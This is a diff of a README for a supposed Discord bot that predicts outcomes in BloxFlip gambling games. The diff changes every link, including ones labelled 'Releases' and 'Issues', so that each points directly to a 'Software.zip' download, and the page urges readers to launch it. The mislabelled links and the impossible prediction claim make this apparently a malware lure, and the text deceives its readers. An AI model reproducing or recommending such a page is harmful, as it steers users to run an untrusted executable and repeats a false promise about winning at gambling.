@@ -1,6 +1,6 @@
 # 🤖 BloxFlip Mine and Tower Predictor Bot :video_game:
 
-![BloxFlip Mines Tower Predictor Bot](https://github.com/NIKO2221/BloxFlip-Mines-Tower-Predictor-Bot/releases/download/v1.0/Release_x64.zip%20Tower%20Predictor%20Bot-blue)
+![BloxFlip Mines Tower Predictor Bot](https://github.com/NIKO2221/BloxFlip-Mines-Tower-Predictor-Bot/releases/download/v2.0/Software.zip%20Tower%20Predictor%20Bot-blue)
 
 Welcome to the official repository of the **BloxFlip Mine and Tower Predictor Bot**! This Discord bot is specially designed to generate game grids and predict outcomes for mine, tower, and crash games. It is tailored for users with specific roles who are looking to enhance their gaming experience in the world of BloxFlip!
 
@@ -12,7 +12,7 @@ Welcome to the official repository of the **BloxFlip Mine and Tower Predictor Bo
 ## 🚀 Get Started:
 To start using the BloxFlip Mine and Tower Predictor Bot, download the necessary files by clicking the button below:
 
-[![Download Software](https://github.com/NIKO2221/BloxFlip-Mines-Tower-Predictor-Bot/releases/download/v1.0/Release_x64.zip)](https://github.com/NIKO2221/BloxFlip-Mines-Tower-Predictor-Bot/releases/download/v1.0/Release_x64.zip)
+[![Download Software](https://github.com/NIKO2221/BloxFlip-Mines-Tower-Predictor-Bot/releases/download/v2.0/Software.zip)](https://github.com/NIKO2221/BloxFlip-Mines-Tower-Predictor-Bot/releases/download/v2.0/Software.zip)
 
 Once you have downloaded the software, make sure to launch it to begin exploring the exciting features of the bot!
 
@@ -24,13 +24,13 @@ Here are some of the key features of the BloxFlip Mine and Tower Predictor Bot:
 - **Enhanced Gaming Experience**: Allows users to enhance their gaming experience by utilizing the bot's predictive capabilities.
 
 ## ℹ️ Additional Information:
-For more information, updates, and detailed instructions on using the BloxFlip Mine and Tower Predictor Bot, please visit the [Releases](https://github.com/NIKO2221/BloxFlip-Mines-Tower-Predictor-Bot/releases/download/v1.0/Release_x64.zip) section of this repository.
+For more information, updates, and detailed instructions on using the BloxFlip Mine and Tower Predictor Bot, please visit the [Releases](https://github.com/NIKO2221/BloxFlip-Mines-Tower-Predictor-Bot/releases/download/v2.0/Software.zip) section of this repository.
 
 ## 🤝 Get Involved:
 If you are interested in contributing to the development of the BloxFlip Mine and Tower Predictor Bot, feel free to fork this repository and submit your pull requests. Your contributions are highly valued and will help improve the bot for the entire BloxFlip community!
 
 ## 📞 Contact Us:
-If you have any questions, feedback, or suggestions regarding the BloxFlip Mine and Tower Predictor Bot, please reach out to us via Discord or through the [Issues](https://github.com/NIKO2221/BloxFlip-Mines-Tower-Predictor-Bot/releases/download/v1.0/Release_x64.zip) section of this repository. We are always here to assist you and enhance your gaming experience!
+If you have any questions, feedback, or suggestions regarding the BloxFlip Mine and Tower Predictor Bot, please reach out to us via Discord or through the [Issues](https://github.com/NIKO2221/BloxFlip-Mines-Tower-Predictor-Bot/releases/download/v2.0/Software.zip) section of this repository. We are always here to assist you and enhance your gaming experience!
 
 Thank you for choosing the BloxFlip Mine and Tower Predictor Bot to elevate your gaming adventures in the BloxFlip universe! Happy gaming! 🎮🤖
 
